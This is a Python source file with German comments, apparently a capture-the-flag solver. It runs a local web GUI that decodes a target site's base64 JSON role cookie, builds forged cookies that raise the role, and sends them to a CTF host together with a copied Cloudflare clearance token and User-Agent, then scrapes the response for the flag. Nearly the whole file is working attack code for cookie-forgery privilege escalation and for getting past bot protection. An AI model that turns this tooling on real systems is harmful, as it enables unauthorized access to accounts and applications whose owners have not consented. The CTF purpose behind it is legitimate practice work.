#!/usr/bin/env python3
# recon_gui.py — dynamische GUI: Recon -> Hebel waehlen -> abschicken -> Flag.
#
# Evolution von solve_gui.py: nichts mehr hardcodiert. Die GUI dekodiert das
# Cookie live (via recon.py), zeigt die gefundenen Hebel, und du feuerst eine
# Mutation ab. Der Request geht von deinem Mac raus (Cloudflare-kompatibel).
#
# Braucht recon.py im selben Ordner.
# Start:  python3 recon_gui.py   -> oeffnet http://127.0.0.1:8777

import re, html, webbrowser, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import requests
from recon import classify

DEFAULT_UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
              "AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/157.0.0.0 Safari/537.36")
DEFAULT_URL = "https://pointeuse.cyberzerk.fr/"
DEFAULT_COOKIE = "profil"
DEFAULT_RAW = "eyJlbXBsb3llIjoiVm91cyAoIzg0NzIpIiwicm9sZSI6ImVtcGxveWUifQ%3D%3D"
FLAG_RE = r"CyberZerk\{.*?\}"
PORT = 8777


def fire(url, cf, ua, cookie_name, forged):
    """Schickt das geforgte Cookie und prueft deterministisch auf Flag."""
    try:
        r = requests.get(url, headers={"User-Agent": ua},
                         cookies={"cf_clearance": cf, cookie_name: forged},
                         timeout=20)
    except Exception as e:
        return None, None, f"Request fehlgeschlagen: {e}"
    m = re.search(FLAG_RE, r.text)
    return r.status_code, (m.group() if m else None), None


# ---------- HTML ----------
CSS = """:root{color-scheme:dark}*{box-sizing:border-box}
body{font:15px/1.5 -apple-system,system-ui,sans-serif;background:#0d1117;
color:#e6edf3;margin:0;padding:32px 16px;display:flex;justify-content:center}
.wrap{width:100%;max-width:680px}h1{font-size:20px;margin:0 0 4px}
.sub{color:#8b949e;margin:0 0 20px;font-size:13px}
label{display:block;font-weight:600;margin:16px 0 4px}
.hint{color:#8b949e;font-size:12px;font-weight:400;margin:2px 0 6px}
input,select,textarea{width:100%;background:#161b22;border:1px solid #30363d;
border-radius:8px;color:#e6edf3;padding:10px 12px;font:13px ui-monospace,Menlo,monospace}
button{margin-top:18px;background:#238636;border:0;border-radius:8px;color:#fff;
font-size:15px;font-weight:600;padding:11px 20px;cursor:pointer}button:hover{background:#2ea043}
.box{margin-top:22px;border:1px solid #30363d;border-radius:8px;padding:16px;background:#161b22}
.badge{display:inline-block;background:#1f6feb;color:#fff;font-size:11px;font-weight:700;
padding:2px 8px;border-radius:20px;margin-left:6px}
.k{color:#8b949e;font-size:12px;margin-top:12px}
.v{font:13px ui-monospace,Menlo,monospace;word-break:break-all}
.lever{border-left:3px solid #d29922;padding:4px 0 4px 10px;margin:10px 0}
.lever.id{border-color:#8b949e}
.flag{font-size:18px;color:#3fb950;font-weight:700;word-break:break-all}
.fail{color:#f85149;font-weight:600}"""


def esc(s):
    return html.escape(str(s))


def page(url, cf, ua, cname, raw, body=""):
    return f"""<!doctype html><html lang="de"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Recon Solver</title><style>{CSS}</style></head><body><div class="wrap">
<h1>Recon Solver</h1>
<p class="sub">Dekodiert das Cookie live, zeigt die Hebel, du feuerst eine Mutation ab.
Laeuft lokal &rarr; Request geht von deiner IP.</p>
<form method="post" action="/recon">
  <label>Ziel-URL</label><input name="url" value="{esc(url)}">
  <label>cf_clearance</label>
  <div class="hint">DevTools &rarr; Application &rarr; Cookies &rarr; pointeuse.cyberzerk.fr.
  Laeuft ab &mdash; frisch holen.</div>
  <input name="cf" value="{esc(cf)}" placeholder="cf_clearance...">
  <label>User-Agent</label><input name="ua" value="{esc(ua)}">
  <label>Cookie-Name</label><input name="cname" value="{esc(cname)}">
  <label>Cookie-Wert (roh, wie im Browser)</label>
  <div class="hint">Der Wert aus dem Cookie-Panel. Recon dekodiert ihn selbst.</div>
  <textarea name="raw" style="min-height:52px;resize:vertical">{esc(raw)}</textarea>
  <button type="submit">Recon starten</button>
</form>
{body}
</div></body></html>"""


def render_findings(f, url, cf, ua, cname, raw, result=""):
    """Baut den Befund-Block inkl. Dropdown der Mutationen + Abschicken-Form."""
    parts = [f'<div class="box"><b>Befund: Cookie \'{esc(f["cookie"])}\'</b>'
             f'<span class="badge">{esc(f["encoding"])}</span>']
    if f["json"] is not None:
        import json as _j
        parts.append(f'<div class="k">Dekodierter Inhalt</div>'
                     f'<div class="v">{esc(_j.dumps(f["json"], ensure_ascii=False))}</div>')

    options, has_mut = [], False
    for lv in f["levers"]:
        if lv["typ"] == "identitaet":
            parts.append(f'<div class="lever id"><b>IDENTITAET</b> · '
                         f'{esc(lv["key"])}={esc(lv["aktuell"])}<br>'
                         f'<span class="hint">{esc(lv["hinweis"])}</span></div>')
        else:
            parts.append(f'<div class="lever"><b>ROLLE</b> · '
                         f'{esc(lv["key"])}={esc(lv["aktuell"])} · '
                         f'{len(lv["mutationen"])} Eskalationen vorbereitet</div>')
            for m in lv["mutationen"]:
                if m["cookie_value"]:
                    has_mut = True
                    options.append(f'<option value="{esc(m["cookie_value"])}">'
                                   f'{esc(m["set"])}</option>')

    if has_mut:
        parts.append(
            '<form method="post" action="/fire">'
            f'<input type="hidden" name="url" value="{esc(url)}">'
            f'<input type="hidden" name="cf" value="{esc(cf)}">'
            f'<input type="hidden" name="ua" value="{esc(ua)}">'
            f'<input type="hidden" name="cname" value="{esc(cname)}">'
            f'<input type="hidden" name="raw" value="{esc(raw)}">'
            '<label>Mutation waehlen &amp; abschicken</label>'
            '<div class="hint">Welche gewinnt? Das weiss Recon nicht &mdash; '
            'genau hier kaeme spaeter der LLM-Schritt.</div>'
            f'<select name="forged">{"".join(options)}</select>'
            '<button type="submit">Abschicken &amp; Flag holen</button></form>')
    else:
        parts.append('<div class="hint">Keine fertige Mutation (z.B. JWT braucht '
                     'Signatur, oder kein Rollen-Hebel gefunden).</div>')

    parts.append(result + '</div>')
    return "".join(parts)


def render_result(status, flag, error):
    if error:
        body = f'<div class="fail">{esc(error)}</div>'
    elif flag:
        body = f'<div class="flag">{esc(flag)}</div>'
    else:
        body = ('<div class="fail">Kein Flag.</div><div class="hint">cf_clearance '
                'abgelaufen, UA stimmt nicht, oder falsche Mutation.</div>')
    s = f'<div class="k">HTTP Status</div><div class="v">{esc(status)}</div>' if status else ""
    return f'<div class="box">{body}{s}</div>'


class Handler(BaseHTTPRequestHandler):
    def _send(self, b):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(b.encode())

    def log_message(self, *a):
        pass

    def _form(self):
        n = int(self.headers.get("Content-Length", 0))
        d = parse_qs(self.rfile.read(n).decode())
        return lambda k, dv="": d.get(k, [dv])[0]

    def do_GET(self):
        self._send(page(DEFAULT_URL, "", DEFAULT_UA, DEFAULT_COOKIE, DEFAULT_RAW))

    def do_POST(self):
        g = self._form()
        url, cf, ua = g("url", DEFAULT_URL), g("cf"), g("ua", DEFAULT_UA)
        cname, raw = g("cname", DEFAULT_COOKIE), g("raw")
        f = classify(cname, raw)
        if self.path == "/fire":
            status, flag, error = fire(url, cf, ua, cname, g("forged"))
            body = render_findings(f, url, cf, ua, cname, raw,
                                   render_result(status, flag, error))
        else:
            body = render_findings(f, url, cf, ua, cname, raw)
        self._send(page(url, cf, ua, cname, raw, body))


if __name__ == "__main__":
    srv = HTTPServer(("127.0.0.1", PORT), Handler)
    u = f"http://127.0.0.1:{PORT}"
    print(f"Recon Solver laeuft:  {u}   (Strg+C zum Beenden)")
    threading.Timer(0.6, lambda: webbrowser.open(u)).start()
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\nBeendet.")
